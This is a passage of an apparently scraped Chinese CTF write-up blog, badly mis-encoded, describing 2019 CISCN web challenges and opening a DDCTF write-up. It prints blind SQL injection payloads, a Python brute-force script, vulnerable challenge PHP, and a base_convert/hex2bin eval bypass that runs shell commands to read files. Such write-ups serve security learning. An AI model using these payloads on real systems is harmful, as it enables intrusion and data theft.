äº†â€¦ç»“æœé”™äº†\u0026hellip;æœ€åè¿˜æ˜¯æ‰‹åŠ¨åŠ è„šæœ¬è·‘å‡ºæ¥äº†\nadmin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),2,1)) = 49 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');# admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),3,1)) = 65 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');# admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),4,1)) = 71 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');# admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),5,1)) = 64 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');# admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),6,1)) = 49 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');# admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),7,1)) = 115 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');# admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),7,1)) = 115 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');# æ³¨æ„è¿™é‡Œæœ€å¥½ä¸è¦ç”¨substr()='x'è¿™æ ·åˆ¤æ–­ï¼Œå¤§å°å†™å¾ˆæœ‰é—®é¢˜ï¼Œè€Œä¸”å½“æ—¶ç½‘ç»œç¯å¢ƒæå…¶ä¸å¥½â€¦è·‘äº†å¥½å‡ ééƒ½æœ‰ä¸åŒçš„ç­”æ¡ˆâ€¦æœ€ååœ¨èµ›åç”¨asciiè·‘å‡ºäº†å¯†ç ï¼Œé™„è„šæœ¬\n# encoding: utf-8 import requests import re index_url = \u0026#34;http://39.97.227.64:52105/\u0026#34; header = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36\u0026#39;, } flag = \u0026#39;\u0026#39; table = \u0026#39;\u0026#39; column = \u0026#39;\u0026#39; proxies={ \u0026#39;http\u0026#39;:\u0026#39;http://127.0.0.1:8080/\u0026#39; } for i in range(1,32): print(i) for j in range(33,126): # j = ord(j) # payload = \u0026#34;0\\\u0026#34;) or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;challenges\u0026#39;),\u0026#34;+ str(i) +\u0026#34;,1))=\u0026#34;+ str(j) +\u0026#34;),sleep(5),0);%23\u0026#34; string1 = \u0026#34;admin\u0026#39; and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),\u0026#34;+ str(i) + \u0026#34;,1)) = \u0026#39;\u0026#34;+ str(j) + \u0026#34;\u0026#39; and rpad(\u0026#39;a\u0026#39;,4999999,\u0026#39;a\u0026#39;) RLIKE concat(repeat(\u0026#39;(a.*)+\u0026#39;,30),\u0026#39;b\u0026#39;);#\u0026#34; payload ={ \u0026#39;username\u0026#39;: string1, \u0026#39;password\u0026#39;: \u0026#39;11\u0026#39; } url = index_url try: r = requests.post(url=url, data=payload,headers=header,timeout=3.5,proxies=proxies) except: flag += chr(j) print(flag) break å¾—åˆ°å¯†ç ï¼š\nF1AG@1s-at_/fll1llag_h3r3 è¿›å»çœ‹åˆ° admin é¡µé¢ï¼Œä¹Ÿå¾ˆæ˜æ˜¾ï¼Œä¹Ÿå°±æ˜¯ Rogue mysql é‚£ä¸€å¥—äº†ã€‚\n \nDDCTF 2019 /HGAME 2019æˆ‘éƒ½æœ‰å†™ç›¸å…³çš„ wp ï¼Œè¿™é‡Œå°±ä¸å†é‡å¤äº†ã€‚è€ä¸€å¥—çš„æ“ä½œï¼Œä¸è¿‡è¿™é‡Œä»–æ˜¯ä¸èƒ½æŒ‡å®šç«¯å£ï¼Œå›ºå®šè®¿é—®ä½ çš„ 3306 ï¼Œæ‰€ä»¥ä½ éœ€è¦æŠŠè‡ªå·±çš„ vps çš„ 3306 ç«¯å£å¼€å¯æ‰è¡Œã€‚æŒ‰ç…§å¯†ç æç¤ºç›´æ¥è¯»å°±æ˜¯äº†\n \né¡ºä¾¿æ‹¿äº†ä¸€æ³¢é¢˜ç›®æºç \n\u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;meta name=\u0026quot;viewport\u0026quot; content=\u0026quot;width=device-width, initial-scale=1, shrink-to-fit=no\u0026quot;\u0026gt; \u0026lt;meta name=\u0026quot;description\u0026quot; content=\u0026quot;\u0026quot;\u0026gt; \u0026lt;meta name=\u0026quot;author\u0026quot; content=\u0026quot;\u0026quot;\u0026gt; \u0026lt;title\u0026gt;å…¨å®‡å®™æœ€ç®€å•çš„SQL\u0026lt;/title\u0026gt; \u0026lt;!-- Bootstrap core CSS --\u0026gt; \u0026lt;link href=\u0026quot;bootstrap.min.css\u0026quot; rel=\u0026quot;stylesheet\u0026quot;\u0026gt; \u0026lt;!-- Custom styles for this template --\u0026gt; \u0026lt;link href=\u0026quot;grid.css\u0026quot; rel=\u0026quot;stylesheet\u0026quot;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body style=\u0026quot;background-color: lightgrey\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;container\u0026quot;\u0026gt; \u0026lt;h1\u0026gt;å…¨å®‡å®™æœ€ç®€å•çš„SQL\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026quot;lead\u0026quot;\u0026gt;æ²¡æœ‰æ¯”è¿™é¢˜æ›´ç®€å•çš„SQLäº†ï¼Œæˆ‘æŠŠç§˜å¯†è—åœ¨æ•°æ®åº“é‡Œé¢äº†ï¼\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;?php error_reporting(0); session_start(); if (!$_SESSION['admin']) { if (!$_SERVER['HTTP_ACCEPT']) { echo \u0026quot;\u0026lt;p style='color: red'\u0026gt;ä½ è«éæ˜¯æœºå™¨äººï¼Ÿ\u0026lt;/p\u0026gt;\u0026quot;; }else if (!empty($_POST['password']) \u0026amp;\u0026amp; !empty($_POST['username'])) { $conn = new mysqli(); $conn -\u0026gt; connect(\u0026quot;localhost\u0026quot;, \u0026quot;ctf123\u0026quot;, \u0026quot;ctf123\u0026quot;, 'ctf', 3306); if ($conn -\u0026gt; connect_errno) { echo \u0026quot;\u0026lt;p style='color: red'\u0026gt;æ•°æ®åº“è¿æ¥å¤±è´¥: \u0026quot; . $conn -\u0026gt; connect_error . \u0026quot;\u0026lt;/p\u0026gt;\u0026quot;; } else { $_POST['username'] = preg_replace(\u0026quot;/join|get_lock|benchmark|sleep|make_set|field|elt|if|case|or|\\|/i\u0026quot;, \u0026quot;QwQ\u0026quot;, $_POST['username']); echo \u0026quot;\u0026lt;p style='color: green'\u0026gt;ç™»å½•ç”¨æˆ·åï¼š\u0026quot; . $_POST['username'] . \u0026quot;\u0026lt;/p\u0026gt;\u0026quot;; $conn -\u0026gt; set_charset(\u0026quot;utf8\u0026quot;); $sql = \u0026quot;select password from user where username='\u0026quot; . $_POST['username'] . \u0026quot;'\u0026quot;; $result = $conn -\u0026gt; query($sql); if ($conn -\u0026gt; errno) { echo \u0026quot;\u0026lt;p style='color: red'\u0026gt;æ•°æ®åº“æ“ä½œå¤±è´¥ï¼\u0026lt;/p\u0026gt;\u0026quot;; }else { if (!$result) { echo \u0026quot;\u0026lt;p style='color: red'\u0026gt;ç™»é™†å¤±è´¥ï¼\u0026lt;/p\u0026gt;\u0026quot;; }else { $row = $result -\u0026gt; fetch_assoc(); if ($row['password'] === $_POST['password'] \u0026amp;\u0026amp; $_POST['username'] === 'admin') { $_SESSION['admin'] = 1; }else { echo \u0026quot;\u0026lt;p style='color: red'\u0026gt;ç™»é™†å¤±è´¥ï¼\u0026lt;/p\u0026gt;\u0026quot;; } } } $conn -\u0026gt; close(); } }else { echo \u0026quot;\u0026lt;p style='color: red'\u0026gt;ä½ ä¸æ˜¯ç®¡ç†å‘˜ï¼\u0026lt;/p\u0026gt;\u0026quot;; } } if ($_SESSION['admin']) { echo \u0026quot;\u0026lt;p style='color: green'\u0026gt;ä½ å¥½ï¼ç®¡ç†å‘˜ï¼\u0026lt;/p\u0026gt;\u0026quot;; if (!empty($_POST['host']) \u0026amp;\u0026amp; !empty($_POST['password']) \u0026amp;\u0026amp; !empty($_POST['username']) \u0026amp;\u0026amp; !empty($_POST['sql']) \u0026amp;\u0026amp; !empty($_POST['database'])) { $conn = new mysqli(); $conn -\u0026gt; connect($_POST['host'], $_POST['username'], $_POST['password'], $_POST['database'], 3306); if ($conn -\u0026gt; connect_errno) { echo \u0026quot;\u0026lt;p style='color: red'\u0026gt;æ•°æ®åº“è¿æ¥å¤±è´¥: \u0026quot; . $conn -\u0026gt; connect_error . \u0026quot;\u0026lt;/p\u0026gt;\u0026quot;; } else { $conn -\u0026gt; set_charset(\u0026quot;utf8\u0026quot;); $result = $conn -\u0026gt; query($_POST['sql']); if (!$result) { echo \u0026quot;\u0026lt;p style='color: red'\u0026gt;SQLæ‰§è¡Œå¤±è´¥ï¼\u0026lt;/p\u0026gt;\u0026quot;; }else { echo \u0026quot;\u0026lt;p style='color: green'\u0026gt;SQLæ‰§è¡ŒæˆåŠŸï¼\u0026lt;/p\u0026gt;\u0026quot;; } $conn -\u0026gt; close(); } }else { echo \u0026quot;\u0026lt;p style='color: green'\u0026gt;ä½ å¯ä»¥åœ¨è¿™é‡Œå¯¹è¿œç¨‹æ•°æ®åº“è¿›è¡Œæ“ä½œï¼\u0026lt;/p\u0026gt;\u0026quot;; } } ?\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;form action=\u0026quot;\u0026quot; method=\u0026quot;post\u0026quot; class=\u0026quot;row\u0026quot;\u0026gt; \u0026lt;?php if (!$_SESSION['admin']) { echo '\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;username\u0026quot; class=\u0026quot;col-6 col-lg-4\u0026quot; placeholder=\u0026quot;username\u0026quot;\u0026gt;'; echo '\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;password\u0026quot; class=\u0026quot;col-6 col-lg-4\u0026quot; placeholder=\u0026quot;password\u0026quot;\u0026gt;'; }else { echo '\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;host\u0026quot; class=\u0026quot;col-6 col-lg-4\u0026quot; placeholder=\u0026quot;host\u0026quot;\u0026gt;'; echo '\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;username\u0026quot; class=\u0026quot;col-6 col-lg-4\u0026quot; placeholder=\u0026quot;username\u0026quot;\u0026gt;'; echo '\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;password\u0026quot; class=\u0026quot;col-6 col-lg-4\u0026quot; placeholder=\u0026quot;password\u0026quot;\u0026gt;'; echo '\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;database\u0026quot; class=\u0026quot;col-6 col-lg-4\u0026quot; placeholder=\u0026quot;database\u0026quot;\u0026gt;'; echo '\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;sql\u0026quot; class=\u0026quot;col-6 col-lg-4\u0026quot; placeholder=\u0026quot;sql\u0026quot;\u0026gt;'; } ?\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; class=\u0026quot;col-6 col-lg-4\u0026quot; value=\u0026quot;submit\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- /container --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; è¿™é¢˜æ¯”è¾ƒå¯æƒœï¼Œæ—¶é—´ä¸å¤ªå¤Ÿï¼Œæ¯”èµ›ç»“æŸçš„40minå¤šå°±åšå‡ºæ¥äº†\u0026hellip;ä»Šå¤©å¤ªå›°äº†ï¼Œä¸­åˆç¡äº†å¥½ä¸€ä¼šï¼Œæ—¶é—´è¶³å¤Ÿçš„è¯è‚¯å®šèƒ½æå‡ºæ¥çš„â€¦å¯æƒœå¯æƒœã€‚\næœ€è¿‘çœ‹äº†è¿˜å¯ä»¥æœ‰\nunionselectcot(1andleft(database(),1)\u0026gt;\u0026#39;a\u0026#39;);#è¿™æ ·çš„ bool ç›²æ³¨çš„å½¢å¼\nDay 2 Web Love_Math \u0026lt;?php error_reporting(0); //å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag if(!isset($_GET[\u0026#39;c\u0026#39;])){ show_source(__FILE__); }else{ //ä¾‹å­ c=20-1  $content = $_GET[\u0026#39;c\u0026#39;]; if (strlen($content) \u0026gt;= 80) { die(\u0026#34;å¤ªé•¿äº†ä¸ä¼šç®—\u0026#34;); } $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;]; foreach ($blacklist as $blackitem) { if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $content)) { die(\u0026#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦\u0026#34;); } } //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp  $whitelist = [\u0026#39;abs\u0026#39;, \u0026#39;acos\u0026#39;, \u0026#39;acosh\u0026#39;, \u0026#39;asin\u0026#39;, \u0026#39;asinh\u0026#39;, \u0026#39;atan2\u0026#39;, \u0026#39;atan\u0026#39;, \u0026#39;atanh\u0026#39;, \u0026#39;base_convert\u0026#39;, \u0026#39;bindec\u0026#39;, \u0026#39;ceil\u0026#39;, \u0026#39;cos\u0026#39;, \u0026#39;cosh\u0026#39;, \u0026#39;decbin\u0026#39;, \u0026#39;dechex\u0026#39;, \u0026#39;decoct\u0026#39;, \u0026#39;deg2rad\u0026#39;, \u0026#39;exp\u0026#39;, \u0026#39;expm1\u0026#39;, \u0026#39;floor\u0026#39;, \u0026#39;fmod\u0026#39;, \u0026#39;getrandmax\u0026#39;, \u0026#39;hexdec\u0026#39;, \u0026#39;hypot\u0026#39;, \u0026#39;is_finite\u0026#39;, \u0026#39;is_infinite\u0026#39;, \u0026#39;is_nan\u0026#39;, \u0026#39;lcg_value\u0026#39;, \u0026#39;log10\u0026#39;, \u0026#39;log1p\u0026#39;, \u0026#39;log\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;mt_getrandmax\u0026#39;, \u0026#39;mt_rand\u0026#39;, \u0026#39;mt_srand\u0026#39;, \u0026#39;octdec\u0026#39;, \u0026#39;pi\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;rad2deg\u0026#39;, \u0026#39;rand\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;sin\u0026#39;, \u0026#39;sinh\u0026#39;, \u0026#39;sqrt\u0026#39;, \u0026#39;srand\u0026#39;, \u0026#39;tan\u0026#39;, \u0026#39;tanh\u0026#39;]; preg_match_all(\u0026#39;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/\u0026#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\u0026#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°\u0026#34;); } } //å¸®ä½ ç®—å‡ºç­”æ¡ˆ  eval(\u0026#39;echo \u0026#39;.$content.\u0026#39;;\u0026#39;); } ä¸€ä¸Šåˆéƒ½åœ¨æ‡µé€¼ï¼Œè¦ä¹ˆæ‰¾åˆ°å¯ä»¥çªç ´çš„æ•°å­¦å‡½æ•°ï¼Œè¦ä¹ˆçªç ´æ­£åˆ™ï¼Œåº”è¯¥å°±æ˜¯è¿™ä¸¤ç§æ€è·¯äº†ã€‚æ•°å­¦å‡½æ•°éƒ½çœ‹äº†ä¸€éï¼Œè²Œä¼¼æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„å‡½æ•°ã€‚æ­£åˆ™åŒ¹é…/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/ï¼Œè¿™ä¸ªæ˜¯ php å˜é‡æ–‡æ¡£ä¸­åŒ¹é…æœ‰æ•ˆå˜é‡åçš„æ­£åˆ™ã€‚æ„Ÿè§‰ä¸¤ä¸ªæ€è·¯éƒ½ä¸å¯¹â€¦æœ€æœ‰å¯èƒ½çš„è¿˜æ˜¯çªç ´æ•°å­¦å‡½æ•°â€¦æ•°ç»„å¯ä»¥ç»•ä¹‹å‰çš„ï¼Œä½†æ˜¯evalä¸èƒ½æ‰§è¡Œ\nçœ‹äº†å¥½å‡ éç›´åˆ°çœ‹åˆ°äº†base_convertå¯ä»¥åœ¨è¿›åˆ¶è½¬æ¢ä¸Šåšæ–‡ç« ï¼Œè€Œä¸”æ ¹æ®phpæ–‡æ¡£\u0026ndash;base_convertï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“\nfrombase å’Œ tobase éƒ½åªèƒ½åœ¨ 2 å’Œ 36 ä¹‹é—´ï¼ˆåŒ…æ‹¬ 2 å’Œ 36ï¼‰ã€‚é«˜äºåè¿›åˆ¶çš„æ•°å­—ç”¨å­—æ¯ a-z è¡¨ç¤ºï¼Œä¾‹å¦‚ a è¡¨ç¤º 10ï¼Œb è¡¨ç¤º 11 ä»¥åŠ z è¡¨ç¤º 35ã€‚ ä¹Ÿå°±æ˜¯ç¬¬äºŒä½ï¼Œç¬¬ä¸‰ä½å‚æ•°å¯ä»¥åœ¨ 2 åˆ° 36 ä¹‹é—´ï¼Œè€Œä¸”é«˜äºåè¿›åˆ¶çš„ç”¨å­—æ¯è¡¨ç¤ºï¼æ—¢ç„¶æ‹¼æ¥è¿›å»çš„éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œè½¬æ¢å‡ºæ¥æ‹¼æ¥è¿›å»åº”è¯¥å¯ä»¥æ‰§è¡Œã€‚\n \næœ¬åœ°ä½¿ç”¨base_convert(55490343972,10,36)()æˆåŠŸæ‰§è¡Œphpinfoï¼Œè¿œç¨‹ä¹Ÿæ‰§è¡Œäº†phpinfoçœ‹çœ‹æ˜¯ä¸æ˜¯æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œçœ‹äº†ä¸€åœˆç„¶è€Œå¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆé—®é¢˜ã€‚\nç„¶åå°è¯•ä½¿ç”¨å„ç§æ‰§è¡Œå‘½ä»¤\nbase_convert(15941,10,36);\t//cat base_convert(1751504350,36,10);\t//system base_convert(696468,36,10);\t//exec base_convert(784,36,10);\t//ls base_convert(21269,36,10);\t//GET è™½ç„¶å¯ä»¥æ‰§è¡Œlsäº†ï¼Œçœ‹åˆ°äº†flag.phpï¼Œä½†æ˜¯è¯»ä¸åˆ°å°±æ¯”è¾ƒéš¾å—äº†ã€‚ç„¶åç›´æ¥å°±è€ƒè™‘åˆ°äº†æ˜¯ä¸æ˜¯å¯ä»¥æœ‰cat *è¿™ç§æ“ä½œï¼Œä½†æ˜¯ç©ºæ ¼è·Ÿ*éƒ½æ— æ³•ç¼–ç â€¦è¿™å°±æ¯”è¾ƒå¤´ç–¼äº†ã€‚è€Œä¸”ä¸»è¦æ˜¯è¿˜å¾—å…¨ä¸ºæ•°å­—ï¼Œæœ‰å­—æ¯çš„çš„è¯å°±ä¼šè¿›whitelistçš„åˆ¤æ–­äº†ã€‚\næ‰€ä»¥å¯èƒ½è¦å°½é‡é¿å…å»ä½¿ç”¨åå…­è¿›åˆ¶ä»€ä¹ˆçš„å«æœ‰å­—æ¯çš„ï¼Œè€ƒè™‘åˆ° ascii ç å¯ä»¥è½¬æ¢ï¼Œåˆå°è¯•äº†ä½¿ç”¨chrå‡½æ•°å»è½¬æ¢\n($pi=base_convert(9453,12,36)).$pi(101).$pi(120).$pi(101).$pi(99)($pi(99).$pi(97).$pi(116).$pi(32).$pi(42)) ($pi=base_convert(9453,12,36)).$pi(101).$pi(120).$pi(101).$pi(99)($pi(108).$pi(115)) $pi(96).$pi(108).$pi(115).$pi(96) ä¸€èˆ¬çš„æ„é€ ç»“æœè‚¯å®šä¸è¡Œâ€¦æ‰€ä»¥è¿™é‡Œæƒ³ç”¨`ls`è¿™ç§å½¢å¼å»æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯ç”±äºæ‹¼æ¥çš„åŸå› ï¼Œä¸€ç›´ä¸èƒ½æ‰§è¡Œâ€¦æ€è·¯å¡äº†å¾ˆä¹…ã€‚\nçœ‹äº†ä¸€äº›ç›¸å…³åå…­è¿›åˆ¶å¤„ç†çš„å‡½æ•°ï¼Œç›´åˆ°çœ‹åˆ°äº†ä¸¤ä¸ªå‡½æ•°ï¼Œä¸€ä¸ªhex2binå‡½æ•°ï¼Œæ˜¯å¯ä»¥æŠŠ 16 è¿›åˆ¶è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œä¸€ä¸ªdechexå‡½æ•°ï¼ŒæŠŠåè¿›åˆ¶è½¬æ¢æˆåå…­è¿›åˆ¶ã€‚\näºæ˜¯æˆ‘ä»¬å¯ä»¥æœ‰\nphp \u0026gt; echo base_convert('636174202a',16,10); 426836762666 php \u0026gt; echo hex2bin(dechex(426836762666)); cat * è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æŠŠ*è¿™ä¸ªåå…­è¿›åˆ¶ä¸º2açš„è½¬æˆåè¿›åˆ¶çº¯æ•°å­—çš„äº†ã€‚\nä½†æ˜¯æˆ‘ä»¬è¦æ€ä¹ˆåˆ©ç”¨hex2binå‘¢ï¼Œæƒ³åˆ°å¯ä»¥åˆ©ç”¨base_convertèµ‹å€¼å˜é‡çš„æ–¹å¼ï¼Œæ‰¾åˆ°æœ€çŸ­çš„å­—ç¬¦ä¸²piï¼Œåˆ©ç”¨$pi=base_convert(37907361743,10,36)æ„é€ å‡ºhex2binã€‚\nè€Œä¸”è¿˜å› ä¸ºechoå¯ä»¥æ¥å—å¦‚ä¸‹çš„æ‹¼æ¥æ–¹å¼ï¼Œä¾‹å¦‚\nphp \u0026gt; echo (1).`id`; 1uid=501(zedd) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),501(access_bpf),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh) php \u0026gt; echo 1,`id`; 1uid=501(zedd) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),501(access_bpf),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh) å°½é‡å–æœ€çŸ­çš„ï¼Œè¿™é‡Œè‚¯å®šæˆ‘ä»¬å°±ç”¨,è¿™ä¸ªå½¢å¼ã€‚\næ‰€ä»¥å¤§è‡´æ€è·¯å°±å·®ä¸å¤šå‡ºæ¥äº†åˆ©ç”¨base_convertæ„é€ hex2binï¼Œç„¶åç”¨æœ€çŸ­çš„å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„execå‡½æ•°å»æ‰§è¡Œcat *çš„å‘½ä»¤\n$pi=base_convert(37907361743,10,36),$pi(65786563)($pi(dechex(426836762666))) ç„¶è€Œæ²¡æˆåŠŸ\u0026hellip;ä¸çŸ¥é“å“ªé‡Œé”™äº†ï¼Œæ„Ÿè§‰æ²¡é“ç†\u0026hellip;\n($pi=base_convert),$pi(696468,10,36)($pi(37907361743,10,36)(7267726570206167)); ($pi=base_convert),$pi(696468,10,36)($pi(37907361743,10,36)(7267726570202466)); æ¥ç€é˜Ÿå‹è¯´å¯ä»¥ç”¨rgrep agå»å¼„ï¼Œè€Œä¸”æœ¬åœ°æ‰“é€šäº†\u0026hellip;ä½†æ˜¯è¿œç¨‹ä»¥ä¸Šæ²¡æ‰“é€šâ€¦æˆ‘åˆä¿®æ”¹äº†å°è¯•å»rgrep flï¼Œä¹Ÿæ²¡æ‰“é€šï¼Œå½“æ—¶æ˜¯è¿™æ ·çš„\n \nå†™ wp çš„æ—¶å€™ï¼Œçªç„¶åˆå‘ç°å¯ä»¥æ‰“é€šäº†\u0026hellip;\n \nä¹Ÿæ˜¯ç¥å¥‡\u0026hellip;æœ€åå½“æ—¶è¿˜æ˜¯æŒ‰ç…§è‡ªå·±çš„æ€è·¯å»èµ°äº†ï¼Œæ„Ÿè§‰æ˜¯ä¸æ˜¯å“ªé‡Œå‡ºé—®é¢˜äº†ï¼Œç¡®å®šæœ‰flag.phpï¼Œæœ€åå°è¯•ä¿®æ”¹cat f*ï¼Œ\nphp \u0026gt; echo base_convert('63617420662a',16,10); 109270211257898 php \u0026gt; echo hex2bin(dechex(109270211257898)); cat f* $pi=base_convert(37907361743,10,36),$pi(65786563)($pi(dechex(109270211257898))) æ‹¿åˆ° flagï¼ˆå¤ç°ç¯å¢ƒä¸‹ï¼‰\n \nbase_convert(37907361743,10,36)(dechex(1598506324));($$pi){1}(($$pi){2})\u0026amp;1=system\u0026amp;2=cat%20flag.php å‰©ä½™ä¸€é¢˜æ„Ÿè§‰æ¯”è¾ƒæœ‰æ„æ€ï¼Œå•ç‹¬å†™ä¸€ä¸‹ã€‚\n","date":"2019-05-06T09:23:55Z","permalink":"https://blog.zeddyu.info/2019/05/06/2019ciscn/","title":"2019 CISCN Web wp"},{"content":"2019 DDCTF web writeup\n[TOC]\nWeb1 æ»´ï½ Description {% colorquote info %} NULL\né¢˜ç›®åœ°å€ï¼šhttp://117.51.150.246\n{% endcolorquote %}\nHacking æ–‡ä»¶è¯»å–\n\u0026lt;title\u0026gt;TmprMlpUWTBOalUzT0RKbE56QTJPRGN3\u0026lt;/title\u0026gt;index.php\u0026lt;/br\u0026gt;index.php\u0026lt;/br\u0026gt;\u0026lt;img src=\u0026#39;data:image/gif;base64,PD9waHANCi8qDQogKiBodHRwczovL2Jsb2cuY3Nkbi5uZXQvRmVuZ0JhbkxpdVl1bi9hcnRpY2xlL2RldGFpbHMvODA2MTY2MDcNCiAqIERhdGU6IEp1bHkgNCwyMDE4DQogKi8NCmVycm9yX3JlcG9ydGluZyhFX0FMTCB8fCB+RV9OT1RJQ0UpOw0KDQoNCmhlYWRlcignY29udGVudC10eXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Jyk7DQppZighIGlzc2V0KCRfR0VUWydqcGcnXSkpDQogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2pwZz1UbXBaTWxGNldYaE9hbU41VWxSYVFrNTZRVEpPZHowOScpOw0KJGZpbGUgPSBoZXgyYmluKGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkX0dFVFsnanBnJ10pKSk7DQplY2hvICc8dGl0bGU+Jy4kX0dFVFsnanBnJ10uJzwvdGl0bGU+JzsNCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwiIiwgJGZpbGUpOw0KZWNobyAkZmlsZS4nPC9icj4nOw0KJGZpbGUgPSBzdHJfcmVwbGFjZSgiY29uZmlnIiwiISIsICRmaWxlKTsNCmVjaG8gJGZpbGUuJzwvYnI+JzsNCiR0eHQgPSBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7DQoNCmVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIi4kdHh0LiInPjwvaW1nPiI7DQovKg0KICogQ2FuIHlvdSBmaW5kIHRoZSBmbGFnIGZpbGU/DQogKg0KICovDQoNCj8+DQo=\u0026#39;\u0026gt;\u0026lt;/img\u0026gt; ç›´æ¥è¯» index.php å¾—åˆ°\n\u0026lt;?php /* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */ error_reporting(E_ALL || ~E_NOTICE); header(\u0026#39;content-type:text/html;charset=utf-8\u0026#39;); if(! isset($_GET[\u0026#39;jpg\u0026#39;])) header(\u0026#39;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09\u0026#39;); $file = hex2bin(base64_decode(base64_decode($_GET[\u0026#39;jpg\u0026#39;]))); echo \u0026#39;\u0026lt;title\u0026gt;\u0026#39;.$_GET[\u0026#39;jpg\u0026#39;].\u0026#39;\u0026lt;/title\u0026gt;\u0026#39;; $file = preg_replace(\u0026#34;/[^a-zA-Z0-9.]+/\u0026#34;,\u0026#34;\u0026#34;, $file); echo $file.\u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; $file = str_replace(\u0026#34;config\u0026#34;,\u0026#34;!\u0026#34;, $file); echo 